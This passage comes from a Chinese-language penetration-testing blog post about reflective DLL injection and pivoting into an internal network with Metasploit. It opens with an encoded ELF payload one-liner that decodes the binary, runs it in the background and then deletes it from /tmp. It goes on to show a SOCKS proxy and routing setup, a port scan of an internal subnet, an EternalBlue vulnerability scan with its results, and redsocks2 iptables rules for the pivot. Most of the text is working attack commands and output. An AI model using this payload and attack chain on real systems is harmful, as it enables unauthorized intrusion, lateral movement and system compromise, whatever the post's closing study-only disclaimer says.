<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> -n f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAjPAAAASgEAAAcAAAAAEAAAagpeMdv341NDU2oCsGaJ4c2Al1toAwMDA2gCAABQieFqZlhQUVeJ4UPNgIXAeRlOdD1oogAAAFhqAGoFieMxyc2AhcB5vesnsge5ABAAAInjwesMweMMsH3NgIXAeBBbieGZtgywA82AhcB4Av/huAEAAAC7AQAAAM2A&gt;&gt;<span class="s1">&#39;/tmp/aenJB.b64&#39;</span> <span class="p">;</span> <span class="o">((</span>which base64 &gt;<span class="p">&amp;</span><span class="m">2</span> <span class="o">&amp;&amp;</span> base64 -d -<span class="o">)</span> <span class="o">||</span> <span class="o">(</span>which base64 &gt;<span class="p">&amp;</span><span class="m">2</span> <span class="o">&amp;&amp;</span> base64 --decode -<span class="o">)</span> <span class="o">||</span> <span class="o">(</span>which openssl &gt;<span class="p">&amp;</span><span class="m">2</span> <span class="o">&amp;&amp;</span> openssl enc -d -A -base64 -in /dev/stdin<span class="o">)</span> <span class="o">||</span> <span class="o">(</span>which python &gt;<span class="p">&amp;</span><span class="m">2</span> <span class="o">&amp;&amp;</span> python -c <span class="s1">&#39;import sys, base64; print base64.standard_b64decode(sys.stdin.read());&#39;</span><span class="o">)</span> <span class="o">||</span> <span class="o">(</span>which perl &gt;<span class="p">&amp;</span><span class="m">2</span> <span class="o">&amp;&amp;</span> perl -MMIME::Base64 -ne <span class="s1">&#39;print decode_base64($_)&#39;</span><span class="o">))</span> <span class="m">2</span>&gt; /dev/null &gt; <span class="s1">&#39;/tmp/CXJyd&#39;</span> &lt; <span class="s1">&#39;/tmp/aenJB.b64&#39;</span> <span class="p">;</span> chmod +x <span class="s1">&#39;/tmp/CXJyd&#39;</span> <span class="p">;</span> <span class="s1">&#39;/tmp/CXJyd&#39;</span> <span class="p">&amp;</span> sleep <span class="m">2</span> <span class="p">;</span> rm -f <span class="s1">&#39;/tmp/CXJyd&#39;</span> <span class="p">;</span> rm -f <span class="s1">&#39;/tmp/aenJB.b64&#39;</span></code></pre></td></tr></table>
</div>
</div>
<p>上面这段指令，是msf从shell升级meter会话的基本手法，这里参考一下，主要就是将被编码的二进制内容解码重组，得到原始二进制可执行文件，在目标后台运行并清除相关文件。</br></p>

<h3 id="内网端口扫描">内网端口扫描</h3>

<p>开启代理并添加默认路由数据到meter会话1，博主这里是1,根据实际更改。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">msf exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use auxiliary/server/socks4a 
msf auxiliary<span class="o">(</span>server/socks4a<span class="o">)</span> &gt; run 
<span class="o">[</span>*<span class="o">]</span> Auxiliary module running as background job <span class="m">0</span>.

<span class="o">[</span>*<span class="o">]</span> Starting the socks4a proxy server
msf auxiliary<span class="o">(</span>server/socks4a<span class="o">)</span> &gt; route add <span class="m">0</span>.0.0.0 <span class="m">0</span>.0.0.0 <span class="m">1</span>
<span class="o">[</span>*<span class="o">]</span> Route added</code></pre></td></tr></table>
</div>
</div>
<p>通过获取到的meter查看当前内部ip，对其C段进行端口开放服务探测</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">msf auxiliary<span class="o">(</span>server/socks4a<span class="o">)</span> &gt; use auxiliary/scanner/portscan/tcp 
msf auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> &gt; <span class="nb">set</span> rhosts <span class="m">10</span>.10.9.0/24
<span class="nv">rhosts</span> <span class="o">=</span>&gt; <span class="m">10</span>.10.9.0/24
msf auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> &gt; <span class="nb">set</span> ports <span class="m">21</span>,22,23,80,443,445
<span class="nv">ports</span> <span class="o">=</span>&gt; <span class="m">21</span>,22,23,80,443,445
msf auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> &gt; <span class="nb">set</span> threads <span class="m">5</span>
<span class="nv">threads</span> <span class="o">=</span>&gt; <span class="m">10</span>
msf auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> &gt; exploit 

<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.1:            - <span class="m">10</span>.10.9.1:22 - TCP OPEN
<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.1:            - <span class="m">10</span>.10.9.1:80 - TCP OPEN
<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.9:            - <span class="m">10</span>.10.9.9:445 - TCP OPEN
<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.9:            - <span class="m">10</span>.10.9.9:22 - TCP OPEN
<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.9:            - <span class="m">10</span>.10.9.9:80 - TCP OPEN
<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.9:            - <span class="m">10</span>.10.9.9:21 - TCP OPEN
<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.10:           - <span class="m">10</span>.10.9.10:445 - TCP OPEN</code></pre></td></tr></table>
</div>
</div>
<h3 id="漏洞扫描">漏洞扫描</h3>

<p>端口扫描环节发现445开放，检测是否存在经典的永恒之蓝漏洞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"> sf auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; use auxiliary/scanner/smb/smb_ms17_010 
msf auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; <span class="nb">set</span> rhosts <span class="m">10</span>.10.9.9
<span class="nv">rhosts</span> <span class="o">=</span>&gt; <span class="m">10</span>.10.9.9
msf auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; exploit 

<span class="o">[</span>-<span class="o">]</span> <span class="m">10</span>.10.9.9:445         - Host does NOT appear vulnerable.
<span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span><span class="m">100</span>% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed
msf auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; <span class="nb">set</span> rhosts <span class="m">10</span>.10.9.10
<span class="nv">rhosts</span> <span class="o">=</span>&gt; <span class="m">10</span>.10.9.10
msf auxiliary<span class="o">(</span>scanner/smb/smb_ms17_010<span class="o">)</span> &gt; exploit 

<span class="o">[</span>+<span class="o">]</span> <span class="m">10</span>.10.9.10:445        - Host is likely VULNERABLE to MS17-010! - Windows <span class="m">7</span> Ultimate <span class="m">7601</span> Service Pack <span class="m">1</span> x86 <span class="o">(</span><span class="m">32</span>-bit<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Scanned <span class="m">1</span> of <span class="m">1</span> hosts <span class="o">(</span><span class="m">100</span>% <span class="nb">complete</span><span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> Auxiliary module execution completed</code></pre></td></tr></table>
</div>
</div>
<h3 id="布置内网渗透环境">布置内网渗透环境</h3>

<p>调整内网渗透网关，设置redsocks2的代理指向kali上建立的代理服务。
<img src="/images/dll_proxy.png" alt="proxy" />
配置允许内网IP流量通过它，默认是局域网IP直连，并不转代理，修改<code>/etc/init.d/redsocks2</code>部分内容为：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">	iptables-restore -n <span class="s">&lt;&lt;-EOF
</span><span class="s">		*nat
</span><span class="s">		:RE</span>DSOCKS2 - <span class="o">[</span><span class="m">0</span>:0<span class="o">]</span>
		-A REDSOCKS2 -d <span class="nv">$proxy_ip</span> -j RETURN
		-A REDSOCKS2 -d <span class="m">172</span>.16.10.0/24 -j RETURN
		<span class="c1">#-A REDSOCKS2 -d 0.0.0.0/8 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 10.0.0.0/8 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 100.64.0.0/10 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 127.0.0.0/8 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 169.254.0.0/16 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 172.16.0.0/12 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 192.0.0.0/24 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 192.0.2.0/24 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 192.88.99.0/24 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 192.168.0.0/16 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 198.18.0.0/15 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 198.51.100.0/24 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 203.0.113.0/24 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 224.0.0.0/4 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 240.0.0.0/4 -j RETURN
</span><span class="c1"></span>		<span class="c1">#-A REDSOCKS2 -d 255.255.255.255 -j RETURN
</span><span class="c1"></span>		-A REDSOCKS2 -p tcp -j REDIRECT --to-ports <span class="nv">$local_port</span>
		-A zone_lan_prerouting -p tcp -j REDSOCKS2
		COMMIT</code></pre></td></tr></table>
</div>
</div>
<p>重启redsocks2服务</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@OpenWrt:~# /etc/init.d/redsocks2 restart</code></pre></td></tr></table>
</div>
</div>
<p>将<code>[1006]win2003sp2(Pen)</code>的网关指向内网网关机器即可展开对目标内部环境的渗透</br>
利用<code>fuzzbunch</code>对目标机器进行测试，详情见视频</p>

<h2 id="视频演示">视频演示</h2>

<video width="720" height="480" controls>
  <source src="/videos/dll.mov">
Your browser does not support the video tag.
</video> 

<h2 id="结语">结语</h2>

<p>本博文结合比较综合的案例对Dll反射远程注入进行了示范，涉及到诸多操作技巧与各位分享，难免有些环节会在各位的环境下行不通，欢迎通过下方的邮箱联系博主，有何疑问欢迎交流。</p>

<h2 id="来源和引文">来源和引文</h2>

<p><a href="http://www.freebuf.com/articles/system/151161.html">http://www.freebuf.com/articles/system/151161.html</a></p>

<h2 id="责任声明">责任声明</h2>

<p>希望各位遵守法律，本博文仅作学习研究分享，不得利用于损害他人利益之事。</p>
    </div>

    
    
<div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">Lucas Wilson</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">2018-10-07</span>
  </p>
  
  <p class="copyright-item">
    <span class="item-title">License</span>
    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
  </p>
</div>

    
    

    <footer class="post-footer">
      

      
      <nav class="post-nav">
        
        
          <a class="next" href="/post/msf_bind_reverse_meter/">
            <span class="next-text nav-default">Msf正反向meterpreter会话的巧妙结合</span>
            <span class="prev-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
    

  

  

  
  </article>
        </div>
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="mailto:lucashell@protonmail.com" rel="me noopener" class="iconfont icon-email"
        title="email" target="_blank">
      </a>
      <a href="https://twitter.com/lucaswi49152666" rel="me noopener" class="iconfont icon-twitter"
        title="twitter" target="_blank">
      </a>
      <a href="https://www.facebook.com/lucaswilson02" rel="me noopener" class="iconfont icon-facebook"
        title="facebook" target="_blank">
      </a>
      <a href="https://github.com/luxshell" rel="me noopener" class="iconfont icon-github"
        title="github" target="_blank">
      </a>
      <a href="https://weibo.com/p/1005056539138381/home?from=page_100505&amp;mod=TAB&amp;is_all=1#place" rel="me noopener" class="iconfont icon-weibo"
        title="weibo" target="_blank">
      </a>
      <a href="https://www.zhihu.com/people/lucaswilson-78/activities" rel="me noopener" class="iconfont icon-zhihu"
        title="zhihu" target="_blank">
      </a>
  <a href="https://luxshell.github.io/index.xml" rel="noopener" type="application/rss+xml" class="iconfont icon-rss"
    title="rss" target="_blank">
  </a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - <a class="theme-link" href="https://github.com/xianmin/hugo-theme-jane">Jane</a>
  </span>

  <span class="copyright-year">
    &copy;
    
      2017 -
    2018
    <span class="heart">
      <i class="iconfont icon-heart"></i>
    </span><span class="author">Lucas Wilson</span></span>
</div>
    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox-3.1.20.min.js"></script>
<script type="text/javascript" src="/dist/jane.min.js?v=2.7.0"></script>






</body>
</html>
